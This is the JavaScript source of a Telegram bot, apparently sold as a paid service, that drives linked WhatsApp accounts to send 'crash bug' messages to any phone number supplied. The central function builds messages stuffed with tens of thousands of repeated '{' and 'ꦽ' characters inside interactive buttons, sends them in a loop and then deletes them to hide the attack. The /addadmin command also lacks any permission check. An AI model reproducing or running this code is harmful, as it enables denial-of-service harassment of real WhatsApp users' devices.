const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));


function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });



async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Instalasii... `,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Try Connect `,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : GAGAL TERHUBUNG`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Berhasil Tersambung❗`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : PAIRING
   └ Kode: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : EROR❗❗
   └ Pesan: ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
    console.log("berhasil tersambung");
    await initializeWhatsAppConnections();
}

initializeBot();


// [ BUG FUNCTION ]

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function pungtion(sock, target, count = 3) {
  const messageIds = [];

  for (let i = 0; i < count; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 99999999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_cancel_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "ꦽ".repeat(3000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                    version: 3,
                  },
                  {
                    name: "camera_permission_request",
                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      // kirim message crash
      const msg = await sock.sendMessage(target, message);
      const messageId = msg.key.id;
      messageIds.push(messageId);

      console.log(`✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId}`);

      await sleep(600);
    } catch (e) {
      console.error("❌ Error NewEra:", e);
    }
  }

  // 🔥 hapus semua pesan setelah dikirim
  for (let i = 0; i < messageIds.length; i++) {
    const id = messageIds[i];
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: false,
        id,
        participant: sock.user.id,
      },
    });
    console.log(`🗑️ Pesan ${i + 1} dihapus`);
  }

  console.log("✅ Semua pesan crash sudah dihapus");
}


function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


//=====CASE MENU=======//

const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  
  bot.sendPhoto(chatId, "https://files.catbox.moe/zro4z1.jpg", {  
    caption: `🔧 ᴋʟɪᴋ ᴄᴏᴍᴀɴᴅ ᴜsᴇ ᴅɪʙᴀᴘᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴜɴᴀᴋᴀɴ ʙᴏᴛ :
> /terbang`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 Owner", url: "https://t.me/jay" }, { text: "👀Info", url: "https://t.me/jay" }]
      ]
    }
  });
});

// Handler untuk /start
bot.onText(/\/terbang/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    const options = {
        caption: "❌ KAMU BUKAN USER PREMIUM SILAHKAN BELI ACCES PREMIUM DENGAN CARA KLIK TOMBOL BUY ACCES DIBAWAH",
        reply_markup: {
            inline_keyboard: [
                [{ text: "👤 𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Killertzy2" }, { text: "👁️ 𝘐𝘯𝘧𝘰", url: "https://t.me/Killertzy2" }],
                [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Killertzy2" }]
            ]
        }
    };

        return bot.sendPhoto(chatId, "https://files.catbox.moe/zro4z1.jpg", options);
}

  bot.sendVideo(chatId, "https://files.catbox.moe/zro4z1.jpg", {  
    caption: `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦

☍ 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "[🦠] 𝘉𝘶𝘨 𝘔𝘦𝘯𝘶", callback_data: "bugmenu" }, { text: "[👤] 𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶", callback_data: "ownermenu" }],
        [{ text: "[💞] 𝘛𝘩𝘢𝘯𝘬𝘴", callback_data: "thanksto" }, { text: "[⚙️] 𝘊𝘰𝘯𝘵𝘳𝘰𝘭 𝘔𝘦𝘯𝘶", callback_data: "controlmenu" }]
      ]
    }
  }).then((sentMessage) => {
    const messageId = sentMessage.message_id;

    bot.on("callback_query", (callbackQuery) => {
      const data = callbackQuery.data;
      let newCaption = "";
      let newButtons = [];

      if (data === "bugmenu") {
        newCaption = `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦

╭━─━☉
║ ▢ /spaceman 62xxx ( bug menu button )
╰━─━━─━━─━━─━━─━━─━━━─━⍟
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "ownermenu") {
        newCaption = `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦

╭━─━✦
┃▢ /addprem ( id ) ( 3d )
┃▢ /addadmin ( id )
┃▢ /deladmin ( Id )
╰━─━━─━━─━━─━━─━━─━━━─━✦
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "thanksto") {
        newCaption = `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦


╭━─━☉
║ ▢ Killertzy ( ᴅᴇᴠᴇʟᴏᴘᴇʀ )
║ ▢ All Buyer Spaceman💞
╰━─━━─━━─━━─━━─━━─━━━─━⍟
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "controlmenu") {
        newCaption = `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦

╭━─━✦
┃ ▢ /listprem
┃ ▢ /setjeda <60>
┃ ▢ /addsender 62xxx
┃ ▢ /delprem ( id )
┃ ▢ /deladmin ( id )
╰━─━━─━━─━━─━━─━━─━━━─━✦
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "mainmenu") {
        newCaption = `
╭━─━( SPACEMAN THUNDER 𖣘
┃ ▢ Developer : Killertzy
┃ ▢ Version : Beta
┃ ▢ Language : Javascript 
╰━─━━─━━─━━─━━─━━─━━━─━✦
☍ 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸`;
        newButtons = [
          [{ text: "[🦠] 𝘉𝘶𝘨 𝘔𝘦𝘯𝘶", callback_data: "bugmenu" }, { text: "[👤] 𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶", callback_data: "ownermenu" }],
          [{ text: "[💞] 𝘛𝘩𝘢𝘯𝘬𝘴", callback_data: "thanksto" }, { text: "[⚙️] 𝘊𝘰𝘯𝘵𝘳𝘰𝘭 𝘔𝘦𝘯𝘶", callback_data: "controlmenu" }]
        ];
      }

      bot.editMessageCaption(newCaption, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: newButtons }
      });

      bot.answerCallbackQuery(callbackQuery.id);
    });
  });
});




//=======CASE BUG=========//
let jedaXnish = 60 * 1000; 
let lastExecutionTime = {};

bot.onText(/\/setjeda (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const newDelay = parseInt(match[1]) * 1000; 

  if (isNaN(newDelay) || newDelay < 0) {
    return bot.sendMessage(chatId, "❌ Format salah. Gunakan /setjeda <detik> contoh: /setjeda 30");
  }

  jedaXnish = newDelay;
  bot.sendMessage(chatId, `✅ Jeda untuk bug berhasil diatur menjadi ${match[1]} detik.`);
});

bot.onText(/\/spaceman (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const now = Date.now();

  
  if (lastExecutionTime[userId] && now - lastExecutionTime[userId] < jedaXnish) {
    const remainingTime = Math.ceil((jedaXnish - (now - lastExecutionTime[userId])) / 1000);
    return bot.sendMessage(chatId, `⏳ Harap tunggu ${remainingTime} detik sebelum menggunakan /locked lagi.`);
  }

  
  lastExecutionTime[userId] = now;

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  bugRequests[chatId] = { stage: "awaitingNumber", jid };

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ᴛᴏxɪᴄ ᴄʀᴀsʜ", callback_data: `vxcrash_x:${jid}` },
          { text: "xɪᴇx xᴄʀᴀsʜ", callback_data: `vxcrash_ui:${jid}` }
        ],
        [
          { text: "ᴢᴇʀᴏ ᴀsᴜʀᴀ", callback_data: `vxcrash_fc:${jid}` },
          { text: "ғʟᴏᴏᴅ ᴄʀᴀsʜ", callback_data: `vxcrash_infinity:${jid}` }
        ],
        [
          { text: "ᴋʏᴜᴛᴀ ᴏɪᴅ", callback_data: `vxblank:${jid}` },
          { text: "ʏᴜxɪᴀ ᴏɪᴅ", callback_data: `vxcrash:${jid}` }
        ],
        [
          { text: "ɪᴏs ғʟᴏɪᴅs", callback_data: `vxios:${jid}` },
          { text: "ғʟᴏɪᴅs xᴇɴᴛʀᴀ🦠", callback_data: `vxscreenv2:${jid}` }
        ]
      ]
    }
  };

  bot.sendPhoto(chatId, "https://files.catbox.moe/zro4z1.jpg", { 
    caption: `
╭━━━━⟮ 𝔗𝘓𝘰𝘤𝘬𝘦𝘥 𝘛𝘢𝘳𝘨𝘦𝘵 ⟯
┃ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━━━━
`,
    parse_mode: "Markdown",
    ...options
  });
});


bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const [action, jid] = callbackQuery.data.split(":");

  if (action.startsWith("vx")) {
    try {
      if (sessions.size === 0) {
        return bot.sendMessage(
          chatId,
          "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
        );
      }

      await bot.editMessageReplyMarkup(
        { inline_keyboard: [[{ text: "Sedang Proses 🔄...", callback_data: "processing" }]] },
        { chat_id: chatId, message_id: messageId }
      );

      let bugType;

      if (action === "vxcrash_x") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "Demous";
      } else if (action === "vxcrash_ui") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "Ui Attack";
      } else if (action === "vxcrash_fc") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "force close";
      } else if (action === "vxcrash_infinity") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "hmmm𝘵";
      } else if (action === "vxblank") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "𝘻";
      } else if (action === "vxcrash") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "⸸";
      } else if (action === "vxios") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "X";
      } else if (action === "vxscreenv2") {
        await pungtion(sessions.values().next().value, jid);
        bugType = "⸸𝘚";
      } else {
        return bot.sendMessage(chatId, "❌ Unknown action.");
      }

      setTimeout(async () => {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [[{ text: "𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥𝘪𝘯𝘨 𝘉𝘶𝘨✅", callback_data: "sent" }]] },
          { chat_id: chatId, message_id: messageId }
        );
      }, 7000); // 7 detik

    } catch (error) {
      bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    }
  }
});





//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "❗ ＬＩＳＴ ＰＲＥＭＩＵＭ ❗\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});